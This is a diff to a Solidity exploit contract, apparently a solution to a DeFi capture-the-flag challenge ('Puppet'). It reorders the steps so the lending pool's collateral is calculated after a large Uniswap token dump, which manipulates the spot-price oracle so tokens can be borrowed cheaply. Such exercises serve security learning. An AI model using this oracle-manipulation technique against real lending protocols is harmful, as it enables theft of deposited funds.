@@ -63,14 +63,6 @@ contract PuppetAttack {
         //approve tokens
         token.approve(address(uniswap), type(uint256).max);
 
-        //get pool balance
-        uint256 _poolBal = token.balanceOf(address(pool));
-        console.log("the pool balance is", _poolBal / 10**18);
-
-        //calculate collateral
-        uint256 _colateral = pool.calculateDepositRequired(_poolBal);
-        console.log("colateral needed is", _colateral / 10**18);
-
         //trade token to offset pool dynamic
         uniswap.tokenToEthTransferInput(
             token.balanceOf(address(this)),
@@ -79,8 +71,12 @@ contract PuppetAttack {
             address(this)
         );
 
-        //calculate collateral again  
-        _colateral = pool.calculateDepositRequired(_poolBal);
+        //get pool balance
+        uint256 _poolBal = token.balanceOf(address(pool));
+        console.log("the pool balance is", _poolBal / 10**18);
+
+        //calculate collateral
+        uint256 _colateral = pool.calculateDepositRequired(_poolBal);
         console.log("colateral needed is", _colateral / 10**18);
 
         //borrow tokens
